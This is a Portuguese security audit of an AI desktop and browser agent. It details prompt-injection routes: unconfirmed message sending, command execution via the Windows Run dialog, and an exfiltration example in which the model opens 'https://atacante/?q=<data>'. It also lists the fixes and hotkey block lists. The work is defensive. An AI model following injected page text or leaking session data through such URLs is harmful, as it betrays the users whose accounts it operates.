# Auditoria de QA e segurança — 2026-11-13

**Revisão:** `fc879fc` + `app/tests/test_security_adversarial.py` (novo, não commitado).
**Escopo:** análise estática, testes offline e simulação de políticas. Nenhum modelo foi chamado (custo US$ 0,00).
O desktop não foi operado e nenhuma página foi injetada.
**Ambiente:** Python 3.14.7 do sistema, não o venv travado em 3.11, que não existe nesta máquina.

## Veredito

**Não liberar para uso com contas reais ainda.** F1–F8 foram corrigidos no código (ver abaixo); falta a validação dinâmica em VM. As suítes existentes passam, mas a porta de efeitos
(`execution.authorization: enforce`) tem desvios confirmados. Os mais graves: as rotinas do
WhatsApp, do Teams e do Outlook enviam mensagens sem pedir confirmação, e um plano do DESKTOP
consegue executar comandos pelo diálogo Executar do Windows.

## Achados

Severidade considerando o modelo de ameaça do projeto: o agente opera o desktop com as sessões logadas do usuário.

| ID | Sev. | Achado | Evidência |
|---|---|---|---|
| F1 | **Crítico — corrigido** | As rotinas de envio do DESKTOP usam `hotkey` Enter/Ctrl+Enter, e `step_risk` só classifica cliques e `delete_file`. Por isso o envio no WhatsApp, Teams e Outlook não passa pela porta `enforce`. O conteúdo pode vir de `{output_summary_N}`, ou seja, de texto lido da web (exemplo no próprio prompt do Maestro, `maestro.py:124`). Isso abre o caminho página → mensagem enviada sem confirmação. | `agents/desktop_agent.py:51,75,133`; `core/action_risk.py:step_risk`; 4 testes xfail |
| F2 | **Crítico — corrigido** | Execução de comando pelo diálogo Executar. Um plano do fallback LLM com `hotkey win+r` → `focus_window "Executar"` → `type_text` → `hotkey enter` passa no `validate_steps` e no `action_policy.authorize`. `_type_text` só bloqueia janelas com título cmd/powershell/terminal. Isso anula, na prática, a regra "execução arbitrária desativada". Confirmado estaticamente; a etapa em tempo real não foi executada. | `core/automation.py:1291-1306`; `core/plan_validator.py:validate_steps`; 2 testes xfail |
| F3 | Alto — corrigido | Exfiltração por `goto`: o piloto do navegador aceita qualquer host http(s), sem política de destino. Um texto injetado numa página pode fazer o modelo abrir `https://atacante/?q=<dados lidos numa aba logada>`. A única defesa é a regra 4 do prompt. | `core/browser_pilot.py:_goto`; 1 teste xfail |
| F4 | Alto — corrigido | O efeito é deduzido de texto não confiável. Em `vision_click`, o rótulo é a descrição escrita pelo próprio modelo ("botão azul" → nenhum efeito). `_HARMLESS` tem precedência: "Enviar pesquisa de satisfação" passa como inofensivo. | `core/action_risk.py:label_risk,ui_risk`; 2 testes xfail |
| F5 | Médio — corrigido | Rótulos consequentes não classificados: concessão OAuth ("Permitir", "Allow", "Autorizar"), "Confirmar", "Continuar", "Seguir", "Salvar alterações" em configurações de conta. "Salvar" e "Próximo" são benignos por decisão explícita (`tests/test_action_risk.py`), então vale reavaliar só o caso de OAuth e de configurações de conta. | 1 teste xfail |
| F6 | Médio — corrigido | A rotina do Outlook envia com Ctrl+Enter mesmo sem mensagem. | 1 teste xfail |
| F7 | Baixo — corrigido | A confirmação inline (`confirmed()`) não é vinculada ao efeito: "pode enviar" também autoriza "pagar". Só é alcançável sem diálogo (`confirm_effect` ausente); o controller sempre o define. | 1 teste xfail |
| F8 | Baixo — corrigido | `EXECUTABLE_EXT` não contém `.py`, `.pyw`, `.pyz`, `.xll`, `.wsc` e `.sct`. Com Python instalado, `open_path` num `.py` executa o script. | 1 teste xfail |
| F9 | Baixo | O código de confirmação por voz é sequencial e previsível (1001, 1002…). Um áudio de fundo poderia acertá-lo. Mitigação parcial: o código aparece só na tela, não é falado. | `desktop/controller.py:153,331` |
| F10 | Info | `process_worker.py` mantém `exec()` e `shell=True`, inalcançáveis porque o dispatcher recusa `run_python`/`run_command`. Remover reduz a superfície. | `core/process_worker.py:18,28` |

### O que está bem feito (controles positivos verificados)

- Aprovação de efeito com token aleatório, prazo de 180 s, uso único e ligada à ação pausada; repetir o mesmo efeito exige nova aprovação.
- Checagem TOCTOU no piloto do navegador: o estado do elemento é conferido de novo antes do clique ou do envio.
- Enter no navegador conta como envio em qualquer campo exceto busca e endereço.
- CLIs externas recebem o prompt pelo stdin, sem injeção via `cmd /c`.
- Logs guardam só os nomes dos parâmetros; o vault redige PII; registros de execução não entram no contexto dos agentes (não há envenenamento de memória por esse caminho).
- `open_path` recusa caminhos UNC (`\\servidor`), o que evita vazamento de hash NTLM.

### Correções aplicadas (2026-11-13)

- **F1/F6:** `action_risk.hotkey_risk` classifica Enter, Ctrl+Enter e Alt+S como `enviar` quando a janela em
  primeiro plano é de um app de mensagem/e-mail (título lido do sistema) ou quando a rotina marca o passo com
  `effect: "enviar"`. A marca só acrescenta a porta, nunca a dispensa. O executor confere o primeiro plano de novo
  antes da tecla. As rotinas do WhatsApp, Teams e Outlook marcam o envio; o Outlook sem mensagem fica só no rascunho.
- **F2:** `action_policy.BLOCKED_HOTKEYS` nega Win, Win+R/X/S/Q, Ctrl+Esc e Ctrl+Shift+Esc, tanto no validador
  (POL-008) quanto na execução. `_shell_surface` impede digitar/colar em terminal, Executar (classe `#32770`),
  busca do Iniciar e Gerenciador de Tarefas, decidindo pelo processo e pela classe da janela, não só pelo título.
  Na dúvida, não digita. Isso vale para `type_text`, `app_type` e o piloto de apps.
- **F3:** o `goto` do piloto do navegador só abre sem perguntar os sites citados no pedido da pessoa
  (`authorized_task`, não o objetivo escrito pelo modelo), os buscadores conhecidos e o endereço inicial.
  Comparação por domínio registrável, então `mercadolivre.com.br.atacante.example` não passa. Outro site vira um
  efeito `navegar` com confirmação, e um site aprovado fica liberado no resto da tarefa. O validador de plano
  recusa `params.url`/`start_url` com texto lido em outra subtarefa (`{output_text_N}` etc., POL-004).
- **F4:** `vision_click` classifica o efeito pelo nome UIA do elemento sob o ponto e de até 3 ancestrais
  (`names_at_point`), não pela descrição do modelo. Vale para o executor e para os dois pilotos, sem perguntar duas
  vezes o que já foi confirmado. `label_risk` só isenta o botão de busca em si ("Enviar consulta…"), não qualquer
  rótulo com palavra de busca.
- Resíduo de F4: se o elemento não expõe nome via UIA (canvas, app sem acessibilidade), nada é classificado.
- **F5:** concessão OAuth ("Permitir", "Allow", "Autorizar", "Authorize", "Conceder acesso") agora conta como
  efeito `aceitar`. "Salvar" e "Próximo" continuam benignos, por decisão de produto já registrada nos testes.
- **F7:** `confirmed(task, kind)` só aceita confirmação do efeito em questão. "Pode enviar" libera só envio;
  "confirmo"/"autorizo" valem só para o efeito que o próprio pedido cita. Um pedido de *escrever* com "confirmo"
  não libera *enviar*, que é o padrão do incidente original. O fixture de `test_voice_bridge_incidents` passou a
  pedir envio explicitamente.
- **F8:** `.xll`, `.wsc`, `.sct`, `.pyc` e `.pyo` entraram em `EXECUTABLE_EXT`. `.py`/`.pyw`/`.pyz`/`.pyzw` são
  recusados por `open_path` (`OPEN_REFUSED_EXT`), mas continuam abrindo no VS Code via `open_in_editor`.
- Verificação final (F1–F8): 475 testes e 537 checks de smoke passam; a suíte adversarial não tem mais `xfail`.
- Verificação (F1–F4): 470 testes e 537 checks de smoke passam; suíte adversarial 25 pass e 3 xfail (F5, F7, F8).
- Verificação anterior (F1/F2): 460 testes e 537 checks de smoke passam; a suíte adversarial ficou com 33 pass e 6 xfail (F3–F5,
  F7, F8). Não testado em sessão real do Windows.

## Threat model (STRIDE resumido)

| Ameaça | Superfície | Estado |
|---|---|---|
| **S**poofing | Áudio ambiente confirmando efeito; janela falsa com título "Executar"/app | F9; foco é conferido por handle |
| **T**ampering | Texto de página/janela redirecionando o plano (prompt injection) | Só regra de prompt; F3, F4 |
| **R**epudiation | Efeitos sem registro | `authorization.jsonl` + ledger: ok, exceto F1 (não registra) |
| **I**nformation disclosure | Exfiltração via `goto`; microfone para GPT-Live | F3; GPT-Live está documentado e é opcional |
| **D**enial of service | Loops do piloto | Limites de 14 turnos e 75 s: ok |
| **E**levation of privilege | Executar/terminal via teclado; `.py` via `open_path` | F2, F8 |

## Gates de liberação

| Gate | Status | Observação | Lacuna |
|---|---|---|---|
| compile | pass | `check_release --code-only` | — |
| smoke (537 checks) | pass | `check_release`, `smoke_code_agent.py` | — |
| qml / vault / whitespace | pass | `check_release` | — |
| regressions (445 testes) | **indisponível** | 2 falhas por `ModuleNotFoundError: websocket` | ambiente sem o venv 3.11 travado |
| dependencies | **indisponível** | o gate exige o lockfile do Python 3.11 | idem |
| Suíte adversarial nova | 12 xfail / 4 pass | `tests/test_security_adversarial.py` | — |
| Confirmação universal de efeitos de GUI | **fail** | F1, F2, F4 | — |
| E2E em VM limpa / injeção dinâmica | **não executado** | — | requer VM dedicada sem contas reais |

Disposição geral: **reprovado** em segurança; os gates de código ficam inconclusivos neste ambiente.

## Correções recomendadas, em ordem

1. **F1/F6:** classificar `hotkey` com Enter/Ctrl+Enter como `enviar` quando o alvo for um app de mensagem
   (em `step_risk`, recebendo o app da rotina) ou, melhor, trocar o passo por uma ação `send_message` própria que
   sempre passe por `_authorize_ui`. O Outlook não deve enviar sem `message`.
2. **F2:** lista de teclas permitidas em `hotkey` (negar `win+r`, `win+x`, `ctrl+shift+esc`) e bloquear `type_text`
   em janelas da classe `#32770` com título Executar/Run, por classe e não só por título.
3. **F3:** política de destino no `_goto`: o host deve ser o pedido, o de partida ou um da mesma busca; outro
   host, ou uma query com dados lidos, passa a pedir confirmação.
4. **F4:** em `vision_click`, classificar pelo texto que o OCR/UIA ler no ponto clicado, não pela descrição do
   modelo; testar `_HARMLESS` só quando nenhum verbo sensível casar.
5. **F5, F7, F8, F9:** acrescentar rótulos OAuth; ligar `confirmed()` ao `kind`; ampliar `EXECUTABLE_EXT`;
   código de voz aleatório de 4 dígitos (`secrets.randbelow`).

Ao corrigir cada item, remova o `@unittest.expectedFailure` correspondente.

## Plano de testes dinâmicos (pendente, com custo)

Rodar só em VM ou conta dedicada. Para gastar o mínimo de crédito:

- Páginas de injeção locais (`file:///`) com instruções embutidas: tentar `goto` externo, clique em "Enviar"
  rotulado como "botão azul" e pedido de envio de conteúdo lido. Uma tarefa por caso, 1 tentativa: cerca de US$ 0,02 cada.
- WhatsApp/Teams com uma conta de teste: confirmar que, após a correção de F1, o envio pede confirmação.
- Evitar `bench_cost.py` (US$ 1,20) e `eval_skills.py` (US$ 0,70): não testam segurança.
